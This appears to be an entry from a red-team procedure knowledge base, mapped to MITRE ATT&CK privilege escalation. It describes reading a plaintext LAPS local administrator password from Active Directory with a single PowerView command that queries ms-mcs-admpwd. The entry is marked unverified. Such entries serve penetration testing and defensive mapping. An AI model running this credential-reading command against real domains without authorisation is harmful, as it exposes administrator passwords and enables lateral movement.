---
id: 6ea13953-8267-43cb-9df8-e8b60371b5be
name: Read LAPS password from domain (credentials)
type: procedure
verified: false
submitted: false
created_at: '2023-01-12T19:27:21.428532+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
platforms:
- Windows
tags:
- '[[administrator]]'
- '[[Permissions]]'
- '[[Privilege Escalation]]'
commands:
- '[[Get-DomainObject -Identity $SYSTEM | select -Expan]]'
---

# Read LAPS password from domain (credentials)

## Summary

Read the LAPS password from the domain using a user credentials, with permission to access the ObjectAceType: "ms-Mcs-AdmPwd" . 

## Description

# Description

Read the LAPS password from the domain using a user credentials, with permission to access the ObjectAceType: "ms-Mcs-AdmPwd" .

## Objective

Read a plain text local administrator password from the domain using LAPS

# Instructions

1. Retrieve the plain text password using PowerView

**Command** ([[Get-DomainObject -Identity $SYSTEM | select -Expan]]):

```bash
Get-DomainObject -Identity $SYSTEM | select -ExpandProperty ms-mcs-admpwd
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]

## Commands Used

- [[Get-DomainObject -Identity $SYSTEM | select -Expan]]

## Tags

- [[administrator]]
- [[Permissions]]
- [[Privilege Escalation]]
